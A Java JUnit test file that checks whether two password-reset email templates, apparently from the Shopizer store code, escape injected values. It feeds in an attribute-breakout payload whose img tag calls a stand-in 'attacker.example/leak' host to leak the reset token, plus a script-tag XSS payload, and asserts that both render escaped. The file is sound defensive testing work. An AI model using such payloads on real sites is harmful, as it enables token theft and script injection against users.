package com.salesmanager.test.utils;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import java.io.InputStream;
import java.io.StringWriter;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.junit.Test;

import freemarker.template.Configuration;
import freemarker.template.Template;

public class PasswordResetEmailTemplateTest {

	private static final String[] TEMPLATES = {
			"templates/email/email_template_password_reset_request_customer.ftl",
			"templates/email/email_template_password_reset_request_user.ftl" };
	private static final Pattern TOKEN = Pattern.compile("\\$\\{([A-Z0-9_]+)");

	@Test
	public void escapesInjectedLinkAndFirstnameInBothTemplates() throws Exception {
		for (String templateName : TEMPLATES) {
			Map<String, Object> model = modelFor(templateName);
			model.put("RESET_PASSWORD_LINK", "https://store.example.com/\"><img src=\"https://attacker.example/leak?t=");
			model.put(firstNameToken(templateName), "<script>alert(1)</script>");

			String output = render(templateName, model);

			assertTrue(output.contains("href=\"https://store.example.com/&quot;&gt;&lt;img"));
			assertTrue(output.contains("&lt;script&gt;"));
			assertFalse(output.contains("<img src=\"https://attacker.example"));
			assertFalse(output.contains("<script>alert(1)"));
		}
	}

	@Test
	public void rendersBenignLinkUnchangedInBothTemplates() throws Exception {
		for (String templateName : TEMPLATES) {
			Map<String, Object> model = modelFor(templateName);
			model.put("RESET_PASSWORD_LINK", "https://store.example.com/customer/DEFAULT/reset/abc-123");

			String output = render(templateName, model);

			assertTrue(output.contains(
					"href=\"https://store.example.com/customer/DEFAULT/reset/abc-123\""));
		}
	}

	private Map<String, Object> modelFor(String templateName) throws Exception {
		configuration().getTemplate(templateName);
		String source;
		try (InputStream stream = getClass().getClassLoader().getResourceAsStream(templateName)) {
			source = new String(stream.readAllBytes(), StandardCharsets.UTF_8);
		}
		Matcher matcher = TOKEN.matcher(source);
		Map<String, Object> model = new HashMap<>();
		while (matcher.find()) {
			model.put(matcher.group(1), "value");
		}
		return model;
	}

	private String render(String templateName, Map<String, Object> model) throws Exception {
		StringWriter output = new StringWriter();
		configuration().getTemplate(templateName).process(model, output);
		return output.toString();
	}

	private Configuration configuration() {
		Configuration configuration = new Configuration(Configuration.VERSION_2_3_31);
		configuration.setClassForTemplateLoading(getClass(), "/");
		return configuration;
	}

	private String firstNameToken(String templateName) {
		return templateName.endsWith("_customer.ftl") ? "EMAIL_CUSTOMER_FIRSTNAME" : "EMAIL_USER_FIRSTNAME";
	}
}
